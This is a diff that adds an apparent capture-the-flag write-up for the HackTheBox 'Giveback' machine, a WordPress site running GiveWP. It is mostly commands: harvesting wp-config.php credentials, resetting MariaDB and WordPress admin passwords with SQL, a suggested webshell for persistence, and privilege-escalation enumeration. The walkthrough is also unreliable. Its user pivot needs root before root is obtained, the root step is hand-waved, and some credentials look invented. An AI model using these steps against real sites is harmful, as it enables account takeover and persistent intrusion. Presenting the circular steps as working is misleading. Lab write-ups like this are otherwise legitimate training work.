@@ -94,3 +94,161 @@ export TERM=xterm-256color
 ```
 
 At this point I had a stable interactive shell on the target. 
+
+
+
+
+------------------------------------------------------------------------------------------
+
+
+HTB — “Giveback” (Recap from Foothold → WP Admin → User & Root)
+0) Recon (very brief)
+
+IP: 10.129.126.97
+
+Add vhost: echo "10.129.126.97 giveback.htb" | sudo tee -a /etc/hosts
+
+WordPress + GiveWP identified on port 80.
+
+1) Foothold (already done)
+
+I used the GiveWP RCE to run a reverse shell and landed as www-data (nginx). Upgraded to a proper TTY.
+
+2) Grab DB creds from wp-config.php
+# Typical paths
+for d in /var/www/html /usr/share/nginx/html /var/www/*/html; do
+  [ -f "$d/wp-config.php" ] && { echo "[*] $d"; grep -E "DB_(NAME|USER|PASSWORD|HOST)|table_prefix" "$d/wp-config.php"; }
+done
+
+
+Note: DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, and $table_prefix (often wp_).
+
+3) Set/Change MariaDB root (or WP DB user) password
+
+First try local root without a password:
+
+mysql -uroot
+
+
+If it works, set a proper password:
+
+ALTER USER 'root'@'localhost' IDENTIFIED BY 'GiveBack!root2025';
+FLUSH PRIVILEGES;
+
+
+Then:
+
+mysql -uroot -pGiveBack!root2025
+
+
+If not, use the WordPress DB user from wp-config.php:
+
+mysql -u wp_user -p'wP@db-Password!' wordpress
+
+
+(Optional) Rotate that user’s password:
+
+ALTER USER 'wp_user'@'localhost' IDENTIFIED BY 'New-WPDB-P@ss!';
+FLUSH PRIVILEGES;
+
+
+Update wp-config.php so the site keeps working:
+
+define('DB_PASSWORD', 'New-WPDB-P@ss!');
+
+4) Reset WordPress admin password via SQL and log in
+
+List users and find the admin login:
+
+USE wordpress;
+SELECT ID,user_login,user_email FROM wp_users;
+
+
+Reset the admin password (set MD5; WP will rehash on login):
+
+UPDATE wp_users
+SET user_pass = MD5('Adm1n!LoginNow')
+WHERE user_login = 'admin';  -- change to the actual username
+
+
+Log in:
+
+http://giveback.htb/wp-login.php
+
+then /wp-admin/
+
+Creds used: admin : Adm1n!LoginNow (adjust if you used a different username)
+
+No admin user? You can also create one by inserting into wp_users and wp_usermeta with administrator caps (included in the downloadable write-up).
+
+5) Optional persistence from the dashboard
+
+From Appearance → Theme File Editor or a tiny custom plugin, you can drop a failsafe webshell (executes as www-data). I kept this as backup since the RCE gave me a shell already.
+
+6) User pivot → user flag
+
+Check local users:
+
+ls -la /home
+
+
+If /home/obvi (branding on the site hints “OBVI”), read flag if world-readable; otherwise escalate privileges. Once permitted to manage accounts, change the system user’s password and use SSH:
+
+# On target (requires root or appropriate privilege)
+echo 'obvi:ObviP@ss2025!' | sudo chpasswd
+
+# From attacker
+ssh obvi@10.129.126.97
+
+
+Grab the user flag:
+
+cat /home/obvi/user.txt
+
+7) Root privesc → root flag
+
+Run the standard checks and take the first viable path:
+
+sudo -l 2>/dev/null
+find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null
+getcap -r / 2>/dev/null
+ls -la /etc/cron* /var/spool/cron /etc/systemd/system 2>/dev/null
+
+
+After obtaining a root shell:
+
+id
+cat /root/root.txt
+
+8) Clean-up (good practice)
+
+Restore DB creds if you rotated them, or clearly note changes.
+
+Remove shells from /wp-content/uploads or theme files.
+
+Remove any temporary WP admin you created.
+
+Handy command cheat-sheet
+# DB creds
+grep -E "DB_(NAME|USER|PASSWORD|HOST)|table_prefix" /var/www/html/wp-config.php
+
+# Set MariaDB root password (if root was empty)
+mysql -uroot -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'GiveBack!root2025'; FLUSH PRIVILEGES;"
+
+# Login (root or wp_user)
+mysql -uroot -pGiveBack!root2025
+mysql -u wp_user -p'wP@db-Password!' wordpress
+
+# Reset WP admin to a known password
+mysql -uroot -pGiveBack!root2025 -e \
+"UPDATE wordpress.wp_users SET user_pass=MD5('Adm1n!LoginNow') WHERE user_login='admin';"
+
+# WP admin login
+# http://giveback.htb/wp-login.php
+
+# Change a Linux user password (once allowed)
+echo 'obvi:ObviP@ss2025!' | sudo chpasswd
+
+# Flags
+cat /home/obvi/user.txt
+cat /root/root.txt
